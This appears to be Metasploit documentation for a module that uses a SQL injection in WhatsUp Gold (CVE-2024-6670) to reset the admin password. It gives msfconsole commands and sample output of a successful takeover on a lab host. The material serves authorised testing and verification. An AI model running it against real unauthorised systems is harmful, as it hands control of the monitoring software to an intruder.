## Vulnerable Application

This module exploits a SQL injection vulnerability in WhatsUp Gold < v24.0.0 (CVE-2024-6670), by changing the password of an existing user
(such as of the default `admin` account) to an attacker-controlled one.

## Testing

The software can be obtained from
[the vendor](https://cdn.ipswitch.com/nm/WhatsUpGold/23.1.3/WhatsUpGold-23.1.3-FullInstall.exe).

Installation instructions are available [here](https://docs.progress.com/bundle/whatsupgold-install-23-1/page/Prior-to-installation.html).

**Successfully tested on**

- WhatsUp Gold v23.1.3 on Windows 22H2
- WhatsUp Gold v23.1.2 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/admin/http/whatsup_gold_sqli 
msf6 auxiliary(admin/http/whatsup_gold_sqli) > set RHOSTS <IP>
msf6 auxiliary(admin/http/whatsup_gold_sqli) > run
```

This should update the password of the default `admin` account.

## Options

### USERNAME
The user of which to update the password (default: admin)

### PASSWORD
The new password for the user

## Scenarios

Running the exploit against WhatsUp Gold v23.1.3 on Windows 22H2 should result in an output similar to the following:

```
msf6 auxiliary(admin/http/whatsup_gold_sqli) > run
[*] Running module against 192.168.217.143

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version: 23.1.3
[+] New password for admin was successfully set:
	admin:SzESLHhWxKyf
[+] Login at: https://192.168.217.143/NmConsole/#home
[*] Auxiliary module execution completed
```
